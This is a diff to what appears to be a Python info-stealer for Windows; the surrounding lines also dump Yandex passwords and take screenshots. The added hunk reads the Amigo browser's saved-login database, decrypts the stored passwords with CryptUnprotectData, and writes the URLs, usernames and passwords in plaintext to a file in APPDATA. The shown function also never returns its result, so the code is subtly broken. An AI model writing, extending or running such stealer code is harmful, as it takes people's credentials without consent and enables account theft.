@@ -110,6 +110,26 @@ file = open(os.getenv("APPDATA") + '\\yandex_passwords.txt', "w+")
 file.write(str(Yandexpass()) + '\n')
 file.close()
 ################################################################################
+#                              AMIGO PASSWORDS                                 #
+################################################################################
+def Amigo():
+   textam = 'Passwords Amigo:' + '\n'
+   textam += 'URL | LOGIN | PASSWORD' + '\n'
+   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Login Data'):
+       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Login Data2')
+       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Login Data2')
+       cursor = conn.cursor()
+       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+       for result in cursor.fetchall():
+           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
+           login = result[1]
+           url = result[0]
+           if password != '':
+               textam += url + ' | ' + login + ' | ' + password + '\n'
+file = open(os.getenv("APPDATA") + '\\amigo_pass.txt', "w+")
+file.write(str(Amigo()) + '\n')
+file.close()
+################################################################################
 #                             SCREEN                                           #
 ################################################################################
 screen = ImageGrab.grab()
